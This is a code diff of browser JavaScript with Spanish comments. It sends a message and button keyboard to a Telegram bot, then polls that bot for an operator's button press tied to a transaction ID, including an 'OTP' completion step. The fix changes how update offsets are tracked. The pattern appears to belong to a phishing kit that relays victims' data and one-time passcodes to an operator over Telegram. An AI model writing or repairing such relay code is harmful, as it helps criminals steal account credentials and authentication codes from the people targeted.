@@ -111,9 +111,22 @@ document.addEventListener('DOMContentLoaded', async () => {
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Iniciar la espera
-  await checkBoton(token, transactionId, 0);
+  // Obtener último update_id conocido
+  const latestOffset = await getLastUpdateId(token);
+  checkBoton(token, transactionId, latestOffset + 1);
 });
+
+async function getLastUpdateId(botToken) {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+    const data = await res.json();
+    if (!data.ok || !data.result.length) return 0;
+    return data.result[data.result.length - 1].update_id;
+  } catch (e) {
+    console.error("Error obteniendo último update:", e);
+    return 0;
+  }
+}
 
 async function checkBoton(botToken, txId, offset) {
   try {
@@ -122,9 +135,10 @@ async function checkBoton(botToken, txId, offset) {
 
     if (!data.ok || !data.result) throw new Error("Sin respuesta válida");
 
-    let lastUpdateId = offset;
+    let newOffset = offset;
+
     for (const update of data.result) {
-      lastUpdateId = update.update_id + 1;
+      newOffset = update.update_id + 1;
 
       if (update.callback_query && update.callback_query.data.includes(txId)) {
         const tipo = update.callback_query.data.split(":")[0];
@@ -142,15 +156,14 @@ async function checkBoton(botToken, txId, offset) {
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ status: "Finalización OTP Exitosa" })
             });
-            return; // no redirige, como solicitaste
+            return; // NO redirige como pediste
         }
       }
     }
 
-    // Esperar nuevamente
-    setTimeout(() => checkBoton(botToken, txId, lastUpdateId), 3000);
+    setTimeout(() => checkBoton(botToken, txId, newOffset), 3000);
   } catch (err) {
-    console.error("Error al verificar botón:", err);
+    console.error("Error verificando botón:", err);
     setTimeout(() => checkBoton(botToken, txId, offset), 3000);
   }
 }
